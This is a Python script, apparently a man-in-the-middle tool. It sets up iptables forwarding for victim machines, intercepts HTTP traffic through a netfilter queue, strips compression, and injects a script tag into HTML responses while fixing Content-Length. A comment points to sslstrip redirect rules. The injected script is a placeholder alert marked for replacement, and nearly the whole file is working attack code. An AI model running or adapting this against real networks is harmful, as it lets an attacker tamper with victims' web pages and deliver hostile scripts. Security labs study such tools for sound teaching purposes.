#!/usr/bin/env python3

import re
import subprocess
import time as time

import netfilterqueue
import scapy.all as scapy


def init_setup(queue_num):

    # Flushing to clear existing iptables
    subprocess.call(["iptables", "--flush"])
    time.sleep(1)
    subprocess.call(["iptables", "--table", "nat", "--flush"])
    time.sleep(1)
    subprocess.call(["iptables", "--delete-chain"])
    time.sleep(1)
    subprocess.call(["iptables", "--table", "nat", "--delete-chain"])

    # Enable IP forwarding
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        subprocess.call(["echo", "1"], stdout=f)
    print("[+] \033[1mEnabled IP forwarding \033[0m\n")
    time.sleep(1)
    # For Test in local machine
    # Comment if unnecessary
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", str(queue_num)])
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", str(queue_num)])

    # For separate victim machines
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", str(queue_num)])
    subprocess.call(["iptables", "-P", "FORWARD", "ACCEPT"])
    print("[+] \033[1mModified IP tables \033[0m\n")

    # If sslstrip is simultaneously run then these iptables commands need to included
    # subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"])


def exit_setup():
    print("-----------------------------------------------")
    print("[/] \033[1mDetected Keyboard Interrupt.......\033[0m")
    print("[/] \033[1mFlushing the IP Tables\033[0m")
    subprocess.call(["iptables", "--flush"])
    time.sleep(1)
    subprocess.call(["iptables", "--table", "nat", "--flush"])
    time.sleep(1)
    subprocess.call(["iptables", "--delete-chain"])
    time.sleep(1)
    subprocess.call(["iptables", "--table", "nat", "--delete-chain"])
    print("[+] \033[92mExiting\033[0m")

def set_load(packet, load):
    ## Modifying the load field in the response packet
    packet[scapy.Raw].load = load

    ## Remove checksum and length fields
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet

def process_packets(packet):
    try:
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw):

            load = str(scapy_packet[scapy.Raw].load)

            # To filter HTTP requests
            if scapy_packet[scapy.TCP].dport == 80:
                print("[/] HTTP Request")
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
                load = load.replace("HTTP/1.1","HTTP/1.0")
            # To filter HTTP Response
            elif scapy_packet[scapy.TCP].sport == 80:
                print("[/] HTTP Response")

                # REPLACE CODE HERE
                injection_code = "<script>alert('WARNING!');</script>"

                load = load.replace("</body>", injection_code + "</body>")
                content_length = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length and "Content-Type: text/html" in load:
                    new_content_length = int(content_length.group(1)) + len(injection_code)
                    print("Old Content length = " + content_length.group(1) + " // New Content length = " + str(new_content_length))
                    load = load.replace(content_length.group(1), str(new_content_length))

            if load != str(scapy_packet[scapy.Raw].load):
                scapy_packet = set_load(scapy_packet, load)
                print(scapy_packet.show())
                packet.set_payload(bytes(scapy_packet))

        packet.accept()
    except IndexError:
        pass

if __name__ == "__main__":

    queue_num = 0
    init_setup(queue_num)
    print("[+] \033[92mPacket Scanning Starting...\033[0m\n-----------------------------")
    try:
        pack_queue = netfilterqueue.NetfilterQueue()
        pack_queue.bind(queue_num, process_packets)
        pack_queue.run()
    except KeyboardInterrupt:
        exit_setup()